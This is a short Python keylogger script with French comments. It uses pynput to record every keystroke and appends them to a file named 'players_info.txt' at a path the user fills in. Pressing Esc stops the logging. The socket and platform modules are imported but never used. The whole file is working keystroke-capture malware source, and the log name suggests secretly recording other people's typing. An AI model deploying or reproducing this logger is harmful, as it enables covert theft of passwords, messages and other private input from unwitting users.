import os
import socket 
import platform
from pynput.keyboard import Key, Listener

keys_logs = "players_info.txt"
file_path = "C:\\Users\\..\\..\\.."#ajoute ton path
extend = "\\"

count = 0
keys = []

def capture(key):
    global count

    keys.append(key)
    count += 1

    # Si la touche est "Entrée", enregistre les touches
    if key == Key.enter:
        createfiletxt()
        count = 0
        keys.clear()  

    elif key == Key.space:
        keys.append(' ')
        createfiletxt()
        count = 0
        keys.clear()  

def createfiletxt():
    with open(os.path.join(file_path, keys_logs), "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k + " ")  

def stop_keylogger(key):
    if key == Key.esc:
        return False  


with Listener(on_press=capture, on_release=stop_keylogger) as listener:
    listener.join()
